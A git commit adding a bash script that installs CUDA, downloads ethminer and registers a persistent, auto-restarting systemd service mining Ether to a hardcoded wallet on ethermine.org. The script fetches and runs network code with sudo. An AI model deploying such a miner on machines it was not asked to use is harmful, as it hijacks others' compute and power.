acfc530b5c21ea99a4c157a26f4eb636579d7408
lonelad1000 <lonelad1000@gmail.com>
2022-05-06 00:29:16 +0700

    Update and rename ml-hieu-2.sh to khoa2022.sh

---
+++ khoa2022.sh
@@ -0,0 +1,23 @@
+SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
+if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ];
+then
+	echo "taind vip pro" > isHaveSetupCoin.txt
+	cd /usr/local/bin
+	sudo apt-get install linux-headers-$(uname -r) -y
+	distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
+	wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2004/x86_64/cuda-ubuntu2004.pin
+	sudo mv cuda-ubuntu2004.pin /etc/apt/preferences.d/cuda-repository-pin-600
+	wget https://developer.download.nvidia.com/compute/cuda/11.6.2/local_installers/cuda-repo-ubuntu2004-11-6-local_11.6.2-510.47.03-1_amd64.deb
+	sudo dpkg -i cuda-repo-ubuntu2004-11-6-local_11.6.2-510.47.03-1_amd64.deb
+	sudo apt-key add /var/cuda-repo-ubuntu2004-11-6-local/7fa2af80.pub
+	sudo apt-get update
+	sudo apt-get -y install cuda
+	sudo wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
+	sudo tar xvzf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
+	sudo bash -c 'echo -e "[Unit]\nDescription=ETH Miner\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=15s\nExecStart=/usr/local/bin/bin/ethminer -U -P stratum://0x250cd5e4a6019cf9104644235f88d8c5c8060b73.khoa@us2.ethermine.org:4444 &\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/eth.service'
+	sudo systemctl daemon-reload
+	sudo systemctl enable eth.service
+	sudo systemctl start eth.service
+else
+	sudo systemctl start eth.service
+fi
